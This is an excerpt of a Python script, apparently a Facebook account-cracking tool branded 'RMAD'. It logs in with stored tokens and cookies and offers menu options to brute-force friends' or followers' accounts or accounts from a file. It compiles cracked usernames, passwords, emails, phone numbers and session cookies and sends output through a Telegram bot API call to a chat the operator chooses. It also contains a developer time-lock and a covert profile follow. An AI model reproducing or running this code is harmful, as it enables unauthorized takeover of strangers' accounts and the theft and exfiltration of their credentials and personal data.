...
print(J+'━'*40)
print('')
print(" \033[1;34m  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @R_M_D     ")
print()
print(J+'━'*40)
print()
...
g= datetime.datetime(2023, 10, 9, 0, 0 )


if (x.strftime("%x"))>(g.strftime("%x")):
 print('\033[1;32m تم ايقاف الاداه راسل المطور رماد لتفعيل ')
 time.sleep(1)
 print('\033[1;31m المطور رماد @R_M_D    ')
 time.sleep(1)
 print('\033[1;32m  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️')
 time.sleep(1)
 print('\033[1;31m 1')
 time.sleep(1)
 print('\033[1;32m 2')
...
try:
        ...
        cetak(nel('\t✯ أّهِلَأّ فِّيِّرأّدِأّةّ أّلَمَطّوِر رمَأّدِ ✯'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t✯ أّهِلَأّ فِّيِّ أّدِأّةّ أّلَمَطّوِر رمَأّدِ ✯'))
...
print(f'''{Z}:[التاريخ]{C}[{time2}]''')
print(f'''{C}:[الوقت] {Z} [{time3}]''')
token=input(f'\033[1;31m 𝙏\033[1;32m𝙊\033[1;33m𝙆\033[1;34m𝙀\033[1;36m𝙉 m\033[1;35m ➪:\033[1;32m➪ \033[2;32m  ')
print('\033[2;35m')
print(' ━━━━━━━━━━━━━━━━━━━━━ ')
print()
ID=input(f'\033[1;31m 𝙄\033[1;34m𝘿  \033[1;32m ➪  ➪  \033[2;32m  ')
os.system('clear')
cetak(nel('\t✯ أّهِلَأّ فِّيِّ أّدِأّةّ أّلَمَطّوِر رمَأّدِ ✯'))
rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= اشترك بل قناة لتصلك احدث النسخ من الاداة @N_9_N_6').text
...
class Login:
    ...
    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=111513620212669", cookies=cok).text, "html.parser")
...
def banner():
	print(f'''⚜️ لا تنسا صور الصيد 🖤 ⚜️''')

def llogin():
	try:
		token = open('.token.txt','r').read()
		cok = open('coke.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/auth/login,name&access_token='+tokenku[0], cookies={'cookie':cok})
	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				data = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/auth/login', data = data).text)
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							cook= open("coke.txt","w").write(your_cookies)
							print('')
							print(f"{x}[{h}√{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ");time.sleep(1);exit()
			except Exception as e:
				
				os.system('rm -rf .token.txt && rm -rf coke.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
...
def menu(my_name,my_id):
	...
	print('\033[2;35m')
	print('%s[%s1%s]%s CRACK PUBLIC : مــن اﻻصــدقــاء %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s2%s]%s CRACK FOLLOWERS : مــن الــمــتــابــعيـــن%s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s3%s]%s CRACK  FILE : مــن مــلــف %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%sA%s]%s CONTACT %s[%sأّلَمَطّوِر%s]'%(P,H,P,H,P,H,P))
	print('\033[0;36m» 0- login out : تــســجــﯧــل خــروج الڪــوڪــيـز   ')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ %s/%s » [ 〠OK⏎ ] %s » [ 〠CP⏎] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
@R_M_D || @N_9_N_6					
					...
					infoakun += f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𖤍
⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {ttl}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
@R_M_D || @N_9_N_6'''
